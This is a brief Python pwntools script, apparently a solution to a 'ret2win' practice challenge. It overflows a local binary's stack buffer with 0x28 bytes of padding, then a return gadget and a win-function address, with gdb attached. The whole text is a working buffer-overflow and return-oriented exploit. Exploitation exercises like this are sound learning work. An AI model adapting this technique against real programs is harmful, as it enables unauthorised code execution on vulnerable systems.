from pwn import *

p = process("ret2win")
gdb.attach(p)

p.sendlineafter(b"> ", b"A"*0x28 + p64(0x40053e) + p64(0x400756))
p.interactive()
